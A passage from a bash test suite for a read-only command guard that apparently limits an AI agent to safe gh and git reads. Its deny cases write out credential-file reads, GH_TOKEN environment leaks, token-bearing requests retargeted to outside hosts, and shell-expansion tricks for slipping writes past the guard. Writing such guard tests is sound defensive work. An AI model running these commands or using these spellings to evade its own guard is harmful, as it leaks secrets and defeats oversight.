expect_deny 'status --verbose produces a patch and must carry the suppression' \
  "git -c core.fsmonitor= --no-optional-locks status --verbose"
expect_deny 'the short spelling as well' \
  "git -c core.fsmonitor= --no-optional-locks status -v"
expect_allow 'a suppressed verbose status is fine' \
  "git -c core.fsmonitor= --no-optional-locks status --verbose --no-ext-diff --no-textconv"
expect_allow 'an ordinary status is untaxed' \
  "git -c core.fsmonitor= --no-optional-locks status --porcelain"

# `sort` may spill to a temporary file past its in-memory buffer, so it stays
# allowed only while no spelling lets a caller AIM that write. These four are the
# property the allowlist's rationale rests on — if one ever passes, the claim
# that the residue is an unreachable temp file stops being true.
expect_deny 'sort -o names an output file' "gh repo list devantler-tech | sort -o /tmp/x"
expect_deny 'sort -T chooses where a spill lands' "gh repo list devantler-tech | sort -T /tmp"
expect_deny 'sort -S lowers the spill threshold' "gh repo list devantler-tech | sort -S 1"
expect_deny 'sort --files0-from reads a file list' \
  "gh repo list devantler-tech | sort --files0-from=/tmp/l"

# gh takes a host in a POSITIONAL too, and the token travels with the host.
expect_deny 'a positional URL retargets the authenticated request' \
  "gh pr view https://example.com/x/y/pull/1"
expect_deny 'a positional host/owner/repo does the same' "gh repo view example.com/x/y"
expect_allow 'an in-repo api endpoint carries no host' \
  "gh api repos/devantler-tech/monorepo/pulls/1"

# jq can borrow its filter from a file the guard never sees.
expect_deny 'jq include loads filter code from the surveyed tree' \
  "gh pr list | jq 'include \"evil\"; leak'"
expect_deny 'jq import is the same mechanism' \
  "gh pr list | jq 'import \"evil\" as e; e::leak'"

# An index refresh rewrites .git/index, which is a write inside a certified read.
expect_deny 'git status without --no-optional-locks rewrites the index' \
  "git -c core.fsmonitor= status --porcelain"
expect_deny 'git ls-files without it does the same' "git -c core.fsmonitor= ls-files"
expect_deny 'git show without suppression runs diff.external' "git show HEAD"
expect_deny 'git log -p without suppression runs diff.external' "git log -p -3"
expect_deny 'git log -u without suppression runs diff.external' "git log -u -3"
expect_deny 'git log --patch without suppression runs diff.external' "git log --patch -3"

# `set -euo pipefail` does not disable pathname expansion, so a method value of
# `*` must not be expanded against the working directory before validation.
expect_deny 'a glob method value is not expanded' "gh api --method '*' repos/devantler-tech/monorepo/pulls"

# An absolute-URL endpoint chooses the outbound host, which is a destination
# decision the agent must never take from text it read.
# A gh flag whose effect lives in its VALUE, which a name-keyed allowlist cannot see.
# `--repo` takes `[HOST/]OWNER/REPO`, so a host there retargets the request while gh
# still attaches a credential for it — the same effect that keeps `--hostname` off the
# allowlist entirely. Only the bare OWNER/REPO form is admitted.
expect_deny 'host in --repo' "gh pr list --repo example.com/devantler-tech/monorepo"
expect_deny 'host in -R' "gh pr list -R example.com/devantler-tech/monorepo"
expect_deny 'host in an attached -R' "gh pr list -Rexample.com/devantler-tech/monorepo"
expect_deny 'scheme in --repo' "gh pr list --repo https://example.com/x/y"
expect_allow 'a bare OWNER/REPO is still fine' "gh pr list --repo devantler-tech/monorepo --json number"
expect_allow 'a bare OWNER/REPO on -R is still fine' "gh pr list -R devantler-tech/monorepo"

# gh evaluates its own `--jq` with an env-enabled formatter, so no `jq` process appears
# in the pipeline and the filter classifier never gets to apply the `env` rule it has.
expect_deny 'gh --jq reads the environment' "gh api rate_limit --jq 'env.GH_TOKEN'"
expect_deny 'gh -q reads the environment' "gh api rate_limit -q 'env.GH_TOKEN'"
expect_deny 'gh --jq bare env' "gh pr list --jq 'env'"
# shellcheck disable=SC2016  # the literal characters are the pattern under test
expect_deny 'gh --jq reads the environment through $ENV' 'gh api rate_limit --jq $ENV.GH_TOKEN'
expect_allow 'an ordinary gh --jq filter is still fine' "gh api rate_limit --jq '.rate.remaining'"
expect_allow 'a gh --jq field name merely containing env' "gh pr list --json number --jq '.[].environment'"

expect_deny 'absolute-URL endpoint' "gh api https://example.com/repos/devantler-tech/monorepo"
expect_deny 'absolute-URL endpoint on the forge host' "gh api https://api.github.com/repos/devantler-tech/monorepo"
expect_allow 'a relative endpoint is still fine' "gh api repos/devantler-tech/monorepo/pulls"

# A filter is not a reader: it may not open the pipeline, and it may not take a
# path. `cat ~/.config/gh/hosts.yml` is a credential read wearing a filter name.
expect_deny 'cat a credential file' "cat /Users/someone/.config/gh/hosts.yml"
expect_deny 'cat a file mid-pipeline' "gh pr list --json number | cat /etc/passwd"
expect_deny 'grep recursively over a directory' "grep -r token /Users/someone/.claude"
expect_deny 'grep a file mid-pipeline' "gh pr list --json number | grep token /etc/passwd"
expect_deny 'jq reading a file mid-pipeline' "gh pr list --json number | jq '.[]' /etc/passwd"
expect_deny 'jq --from-file' "gh pr list --json number | jq -f /tmp/prog.jq"
expect_deny 'sed reading a file mid-pipeline' "gh pr list --json number | sed 's/a/b/' /etc/passwd"
expect_deny 'head of a file mid-pipeline' "gh pr list --json number | head -5 /etc/passwd"
expect_deny 'a filter opening the pipeline' "jq '.' "
expect_deny 'sort opening the pipeline' "sort /etc/passwd"
expect_allow 'grep with a pattern only' "gh api repos/x/y/branches --jq '.[].name' | grep -E '^claude/'"
expect_allow 'grep with -e is still fine' "gh pr list --json number | grep -e claude"
expect_allow 'tr takes its two sets' "gh pr list --json number | tr 'a-z' 'A-Z'"
expect_allow 'cut with a delimiter' "gh pr list --json number | cut -d, -f1"
expect_allow 'head with a count' "gh repo list devantler-tech | head -n 20"

# --- Regressions: shell spellings a text scanner cannot see through ---------
#
# Every one of these was ALLOWED by the scanner that classified the command as
# TEXT. They are not eight unrelated bugs: each is another spelling of a word
# the shell rewrites before the program ever sees it, which is why the guard now
# resolves one literal argument vector first and classifies only that.

# A shell expansion the guard cannot perform is refused rather than guessed at,
# because its result — a flag, a second operand, a path — is exactly what the
# classification depends on.
expect_deny 'brace expansion can manufacture a method flag' \
  "gh api {--method,POST} repos/devantler-tech/monorepo/issues"
expect_deny 'brace expansion can manufacture an operand' \
  "gh pr list --json number | grep -E claude{,/x}"
expect_deny 'ANSI-C quoting hides the operation keyword' \
  "gh api graphql -f query=\$'\\x6dutation{x}'"
expect_deny 'a glob can expand into flags the guard never saw' "git diff *"
expect_allow 'parameter expansion stays allowed, as documented' \
  "git -C \$REPO log --oneline -5"
expect_allow 'a braced parameter expansion is not brace expansion' \
  "gh api repos/\${OWNER}/monorepo/pulls --paginate"

# gh switches to POST as soon as a field is set, in EVERY spelling of the flag.
expect_deny 'attached short field flag' "gh api repos/devantler-tech/monorepo/issues -fbody=hi"
expect_deny 'attached short raw-field flag' "gh api repos/devantler-tech/monorepo/issues -Fbody=hi"
expect_deny 'attached long field flag' "gh api repos/devantler-tech/monorepo/issues --field=body=hi"
expect_deny 'attached long input flag' "gh api repos/devantler-tech/monorepo/issues --input=payload.json"

# gh honours the LAST method flag, so a harmless first one is a free bypass.
expect_deny 'a repeated method flag whose last value is a write' \
  "gh api --method GET --method POST repos/devantler-tech/monorepo/issues"
expect_deny 'a repeated method flag in attached form' \
  "gh api -X GET -XPOST repos/devantler-tech/monorepo/issues"

# `-F value` beginning with @ makes gh read that file and send its contents.
expect_deny 'a file-backed graphql field reads a local file' \
  "gh api graphql -F token=@/Users/someone/.config/gh/hosts.yml -f query='{viewer{login}}'"
expect_deny 'a file-backed field on any endpoint' \
  "gh api graphql -f token=@/etc/passwd -f query='{viewer{login}}'"

# An unknown flag is a flag whose effect the guard has not established.
expect_deny 'an unrecognised gh api flag' "gh api repos/devantler-tech/monorepo/pulls --nope"

# git writes these files itself — no shell redirection for the scanner to catch.
expect_deny 'git diff --output writes a file' \
  "git -c core.fsmonitor= --no-optional-locks diff --no-ext-diff --no-textconv --output=/tmp/guard-bypass"
expect_deny 'git diff --output in separated form' \
  "git -c core.fsmonitor= --no-optional-locks diff --no-ext-diff --no-textconv --output /tmp/guard-bypass"
expect_deny 'an unrecognised git option' "git log --nope"

# grep's operands are PATTERNS [FILE]: once -e supplies the pattern, every
# positional word is a file — in the attached spelling too.
expect_deny 'attached grep -e leaves the operand a file' \
  "gh pr list --json number | grep -e'.*' /Users/someone/.config/gh/hosts.yml"
expect_deny 'grep --regexp= leaves the operand a file' \
  "gh pr list --json number | grep --regexp='.*' /etc/passwd"

# GNU sed reads `w/tmp/g` as a write flag, so the last delimiter is not the end
# of the substitution.
expect_deny 'a sed write flag hidden behind delimiters' \
  "gh pr list --json number | sed 's/a/b/w/tmp/g'"
expect_deny 'a sed execute flag hidden behind delimiters' \
  "gh pr list --json number | sed 's/a/b/e/tmp/g'"
expect_allow 'an ordinary substitution with flags still passes' \
  "gh pr list --json number | sed 's/a/b/g'"

# Quote boundaries carry meaning: a quoted pattern is ONE operand, and a scanner
# that splits on whitespace turns a legitimate read into a denied file read.
expect_allow 'a quoted pattern containing a space is one operand' \
  "gh pr list --json title --jq '.[].title' | grep -E 'release candidate'"
expect_allow 'a quoted sed program containing a space' \
  "gh pr list --json number | sed 's/a b/c d/'"
expect_allow 'a quoted jq expression containing spaces' \
  "gh api rate_limit --jq '.resources | to_entries | map(.key)'"

# --- Bundled short flags (agent-plugins#186) ---------------------------------
#
# POSIX lets a caller bundle boolean short flags into one word: `-sc` is `-s -c`.
# A name-keyed lookup sees `-sc` as one unknown name and denies a read whose
# every component it already admits. The unbundled spelling is the control: it
# must pass regardless, or the cases below prove nothing about bundling.
expect_allow 'jq -s -c unbundled is the control' "gh pr list --json number | jq -s -c '.'"
expect_allow 'jq -sc bundles two allowlisted booleans' "gh pr list --json number | jq -sc '.'"
expect_allow 'grep -oE bundles two allowlisted booleans' \
  "gh api repos/x/y/branches --jq '.[].name' | grep -oE '^claude/'"
expect_allow 'grep -iEn bundles three allowlisted booleans' \
  "gh api repos/x/y/branches --jq '.[].name' | grep -iEn 'claude/'"
expect_allow 'sort -run bundles three allowlisted booleans' \
  "gh api repos/x/y/branches --jq '.[].name' | sort -run"
# A bundle is admitted only when EVERY component is. One unknown or one
# value-taking component denies the word, and the denial names that component
# so the caller can fix the spelling rather than guess.
expect_deny 'grep -oX carries an unknown component' \
  "gh api repos/x/y/branches --jq '.[].name' | grep -oX 'claude/'"
expect_deny 'grep -iA bundles a value-taking flag' \
  "gh api repos/x/y/branches --jq '.[].name' | grep -iA 'claude/'"
expect_deny 'jq -sf bundles the file-loading flag' "gh pr list --json number | jq -sf /tmp/prog.jq"
expect_deny_names 'grep -or bundles the recursive flag' \
  "gh api repos/x/y/branches --jq '.[].name' | grep -or token /Users/someone/.claude" \
  "component '-r'"
# `--` ends option parsing for the FILTER too: every later word is an operand,
# so `head -- -qv` reads a file literally named `-qv` (a symlink the surveyed
# tree can plant). A bundle that reads as flags must never be admitted there.
expect_deny 'head -- -qv reads a file named -qv' "gh api x --jq '.n' | head -- -qv"
expect_deny 'head -- -q reads a file named -q' "gh api x --jq '.n' | head -- -q"
expect_deny 'jq -- -sc leaves an operand past the cap' "gh pr list --json number | jq -- '.' -sc"
expect_allow 'grep -- pattern is one operand' "gh api repos/x/y/branches --jq '.[].name' | grep -E -- '^claude/'"
expect_deny_names 'a rejected bundle names the offending component' \
  "gh api repos/x/y/branches --jq '.[].name' | grep -oX 'claude/'" "component '-X'"
expect_deny_names 'a bundled value-taking flag is named as such' \
  "gh api repos/x/y/branches --jq '.[].name' | grep -iA 'claude/'" "component '-A'"
# A value-taking flag with its value ATTACHED is not a bundle and keeps its
# established meaning on both sides of the gate.
expect_allow 'grep -A3 attached value is still a context flag' \
  "gh api repos/x/y/branches --jq '.[].name' | grep -A3 claude"
expect_deny 'attached grep -e still leaves the operand a file' \
  "gh pr list --json number | grep -e'.*' /Users/someone/.config/gh/hosts.yml"
expect_allow 'head -n20 attached value is still a count' "gh api x --jq '.n' | head -n20"

# --- Regressions: an allowlisted flag that is itself the write ---------------
#
# The argv inversion closed the "another spelling" class, and review moved on to
# a different one: entries the allowlist itself granted, and effects that depend
# on state outside argv. A flag is on the list only once its effect is known.

expect_deny 'gh api --cache writes a response cache' "gh api repos/devantler-tech/monorepo --cache 1h"
expect_deny 'gh api --cache in attached form' "gh api repos/devantler-tech/monorepo --cache=1h"
expect_deny 'gh api --hostname sends the token to another host' \
  "gh api --hostname example.com /test"
expect_deny 'gh pr view --web launches a browser' "gh pr view 1 --repo devantler-tech/monorepo --web"
expect_deny 'gh issue list --web launches a browser' "gh issue list --repo devantler-tech/ksail --web"
expect_deny 'an unrecognised flag on a gh read verb' "gh pr list --repo devantler-tech/ksail --nope"
expect_allow 'the ordinary read verbs still pass their real flags' \
  "gh pr list --repo devantler-tech/platform --state open --limit 100 --json number,title"

# jq reads process state without touching the filesystem.
expect_deny 'jq env exposes the process environment' "gh pr list --json number | jq -n env"
expect_deny 'jq ENV-variable access exposes the process environment' "gh pr list --json number | jq '\$ENV.GH_TOKEN'"
expect_deny 'jq getpath over env' "gh pr list --json number | jq 'env.GH_TOKEN'"
expect_allow 'an ordinary jq program is untouched' \
  "gh pr list --json number | jq -r '.[].number'"

# A parameter expansion carrying a default synthesizes argv with no control over
# the environment at all — a plain \$VAR stays the documented limit.
expect_deny 'a defaulted parameter expansion synthesizes a flag' \
  "gh api \"\${GUARD_UNSET_A:---method}\" \"\${GUARD_UNSET_B:-POST}\" repos/x/y/issues"
expect_deny 'an alternate-value parameter expansion' "gh api \"\${X:+--method}\" repos/x/y"
expect_deny 'a word-splitting default outside quotes' "gh api \${X:---method} repos/x/y"
expect_allow 'a plain parameter expansion is still allowed' "git -C \$REPO log --oneline -5"
expect_allow 'a plain braced parameter expansion is still allowed' \
  "gh api repos/\${OWNER}/monorepo/pulls"

# Bash deletes a backslash-newline before the program sees it.
expect_deny 'an escaped newline hides the operation keyword' \
  "gh api graphql -f query=\"muta\\
tion{x}\""

# sed takes an input FILE after its script.
expect_deny 'a second sed operand is an input file' "gh pr list --json number | sed -n p p"
expect_deny 'a file operand after a substitution' "gh pr list --json number | sed 's/a/b/' /etc/passwd"
expect_allow 'a single sed script is still fine' "gh pr list --json number | sed -n '1p'"

# ---------------------------------------------------------------------------
# Usage
# ---------------------------------------------------------------------------

expect_usage 'no arguments'
expect_usage 'unknown argument' --nope
expect_usage 'command flag with no value' --command
expect_usage 'an all-whitespace command' --command '   '

# GH_TELEMETRY environment class — deny unless 0 or false is already set.
# Git-only commands stay allowed without it; gh reads do not.
(
  unset GH_TELEMETRY
  expect_deny 'gh read with GH_TELEMETRY unset' \
    'gh pr list --json number' \
    'export GH_TELEMETRY=0'
  GH_TELEMETRY='' expect_deny 'gh read with GH_TELEMETRY empty' \
    'gh pr list --json number' \
    'export GH_TELEMETRY=0'
  GH_TELEMETRY=1 expect_deny 'gh read with GH_TELEMETRY=1' \
    'gh pr list --json number' \
    'export GH_TELEMETRY=0'
  expect_allow 'git-only rev-parse with GH_TELEMETRY unset' \
    'git rev-parse HEAD'
)
GH_TELEMETRY=false expect_allow 'gh read with GH_TELEMETRY=false' \
  'gh pr list --json number'

# stdin form
# ── consumer-declared, stdin-only classifiers ────────────────────────────────
#
# BOTH STATES are tested, because either alone proves nothing: with the variable
# unset the guard must behave exactly as it did before (or this is not additive),
# and with it set exactly one shape may pass (or it is not a narrow widening).
#
# DECL is never executed — the guard only ever classifies a string — so it is a
# path, not a file, and this stays hermetic.
DECL=/opt/consumer/.claude/scripts/pr-ownership-disclosure.sh
DECL2=/opt/consumer/.claude/scripts/second-classifier.sh
FORGE="gh pr view 3034 --repo devantler-tech/platform --json body --jq .body"

expect_allow_declared() {
  local label=$1 cmd=$2 out status=0
  out=$(SURVEYOR_FORGE_READONLY_CLASSIFIERS="$DECL:$DECL2" "$GUARD" --command "$cmd" 2>&1) || status=$?
  if [ "$status" -eq 0 ]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    printf 'FAIL  %s\n      expected allow, got exit %s: %s\n      command: %s\n' \
      "$label" "$status" "$out" "$cmd"
  fi
}

expect_deny_declared() {
  local label=$1 cmd=$2 out status=0
  out=$(SURVEYOR_FORGE_READONLY_CLASSIFIERS="$DECL:$DECL2" "$GUARD" --command "$cmd" 2>&1) || status=$?
  if [ "$status" -eq 1 ]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    printf 'FAIL  %s\n      expected deny (exit 1), got exit %s: %s\n      command: %s\n' \
      "$label" "$status" "$out" "$cmd"
  fi
}

# STATE 1 — undeclared (the default). Nothing changes.
expect_deny 'undeclared classifier is denied as a filter' \
  "$FORGE | $DECL --input -"
expect_deny 'undeclared classifier is denied in leading position' \
  "$DECL --input -"

# An EMPTY declaration admits nothing. Guards the `[ -n ... ]` early return: a
# bug that treated empty as "match anything" would pass every test above.
empty_status=0
SURVEYOR_FORGE_READONLY_CLASSIFIERS='' "$GUARD" --command "$FORGE | $DECL --input -" \
  >/dev/null 2>&1 || empty_status=$?
if [ "$empty_status" -eq 1 ]; then
  pass=$((pass + 1))
else
  fail=$((fail + 1))
  printf 'FAIL  empty declaration admits nothing\n      expected deny, got exit %s\n' "$empty_status"
fi

# STATE 2 — declared. Exactly one shape passes.
expect_allow_declared 'declared classifier consumes a forge read on stdin' \
  "$FORGE | $DECL --input -"
expect_allow_declared 'the second entry in the list is split correctly' \
  "$FORGE | $DECL2 --input -"
expect_allow_declared 'declared classifier may sit after another filter' \
  "$FORGE | jq -r '.body' | $DECL --input -"

# The forge-first invariant survives the widening: a declared classifier still
# may not OPEN the pipeline, which is what keeps it off the local filesystem.
expect_deny_declared 'declared classifier still may not lead the pipeline' \
  "$DECL --input -"

# argv is restricted to the stdin form, so it cannot be aimed at a file or at a
# second network target.
expect_deny_declared 'declared classifier may not take a path operand' \
  "$FORGE | $DECL --input /tmp/body.json"
expect_deny_declared 'declared classifier may not use its fetching mode' \
  "$FORGE | $DECL --repo devantler-tech/platform --pr 3034"
expect_deny_declared 'declared classifier needs an explicit --input' \
  "$FORGE | $DECL"
expect_deny_declared 'declared classifier may not repeat --input' \
  "$FORGE | $DECL --input - --input -"
expect_deny_declared 'declared classifier --input needs a value' \
  "$FORGE | $DECL --input"

# Identity is the exact absolute path, so neither a basename nor a lookalike
# prefix inherits the declaration.
expect_deny_declared 'a basename does not inherit the declaration' \
  "$FORGE | pr-ownership-disclosure.sh --input -"
expect_deny_declared 'a relative spelling does not inherit the declaration' \
  "$FORGE | ./.claude/scripts/pr-ownership-disclosure.sh --input -"
expect_deny_declared 'a path-prefix lookalike is not the declared path' \
  "$FORGE | ${DECL}.bak --input -"
expect_deny_declared 'an undeclared sibling script is still denied' \
  "$FORGE | /opt/consumer/.claude/scripts/board-add.sh --input -"

# A RELATIVE ENTRY in the declaration authorises nothing, even when the
# invocation matches it character for character. Without this case the
# absolute-path requirement is untested: every entry above is already absolute,
# so string equality alone would pass all of them and the `/*` guard could be
# deleted with no test noticing. A relative entry cannot identify one file —
# it resolves against whatever directory the agent happens to be standing in —
# which is exactly why it must not be honoured.
for rel_entry in '.claude/scripts/pr-ownership-disclosure.sh' \
  './.claude/scripts/pr-ownership-disclosure.sh' \
  '../scripts/pr-ownership-disclosure.sh'; do
  rel_status=0
  SURVEYOR_FORGE_READONLY_CLASSIFIERS="$rel_entry" \
    "$GUARD" --command "$FORGE | $rel_entry --input -" >/dev/null 2>&1 || rel_status=$?
  if [ "$rel_status" -eq 1 ]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    printf 'FAIL  relative declaration entry authorises nothing (%s)\n      expected deny, got exit %s\n' \
      "$rel_entry" "$rel_status"
  fi
done

# PATHNAME EXPANSION must not widen a declaration.
#
# This case needs real files or it cannot discriminate: with nothing to match,
# bash leaves the pattern literal and an unguarded split passes the test by
# accident. With two matching files present, an unguarded `set -- $VAR` expands
# the wildcard into BOTH real paths, and an executable the deployment never
# named is then accepted as a declared classifier.
glob_tmp=$(mktemp -d)
mkdir -p "$glob_tmp/a" "$glob_tmp/b"
: > "$glob_tmp/a/x.sh"
: > "$glob_tmp/b/x.sh"
glob_status=0
SURVEYOR_FORGE_READONLY_CLASSIFIERS="$glob_tmp/*/x.sh" \
  "$GUARD" --command "gh pr list --json number | $glob_tmp/a/x.sh --input -" \
  >/dev/null 2>&1 || glob_status=$?
if [ "$glob_status" -eq 1 ]; then
  pass=$((pass + 1))
else
  fail=$((fail + 1))
  printf 'FAIL  a wildcard declaration does not expand to real paths\n      expected deny, got exit %s\n' \
    "$glob_status"
fi
# And the COMMAND side needs no separate rule: a word carrying a glob character
# is refused by the tokenizer before any classification runs, declared or not.
# That is why disabling expansion on the DECLARATION is the whole fix — a
# wildcard entry can never be invoked as written, so its only possible effect
# was to silently authorise the real paths it expanded to.
lit_status=0
SURVEYOR_FORGE_READONLY_CLASSIFIERS="$glob_tmp/*/x.sh" \
  "$GUARD" --command "gh pr list --json number | $glob_tmp/*/x.sh --input -" \
  >/dev/null 2>&1 || lit_status=$?
if [ "$lit_status" -eq 1 ]; then
  pass=$((pass + 1))
else
  fail=$((fail + 1))
  printf 'FAIL  a glob-bearing command word is refused by the tokenizer\n      expected deny, got exit %s\n' \
    "$lit_status"
fi
rm -rf "$glob_tmp"

# NEGATIVE CONTROLS — the write-blocking layer is untouched by the declaration.
expect_deny_declared 'a write is still denied while a classifier is declared' \
  "gh pr merge 3034 --repo devantler-tech/platform --squash"
expect_deny_declared 'a classifier cannot carry a chained write' \
  "$FORGE | $DECL --input - ; gh pr merge 3034 --squash"
expect_deny_declared 'a classifier cannot carry a redirection to a file' \
  "$FORGE | $DECL --input - > /tmp/owner.txt"

stdin_status=0
printf '%s' "gh pr list --json number" | "$GUARD" --stdin >/dev/null 2>&1 || stdin_status=$?
if [ "$stdin_status" -eq 0 ]; then
  pass=$((pass + 1))
else
  fail=$((fail + 1))
  printf 'FAIL  stdin form\n      expected allow, got exit %s\n' "$stdin_status"
fi

stdin_status=0
printf '%s' "gh pr merge 2786 --squash" | "$GUARD" --stdin >/dev/null 2>&1 || stdin_status=$?
if [ "$stdin_status" -eq 1 ]; then
  pass=$((pass + 1))
else
  fail=$((fail + 1))
  printf 'FAIL  stdin form denies a mutation\n      expected deny, got exit %s\n' "$stdin_status"
fi

printf '\nforge-readonly-guard: %s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
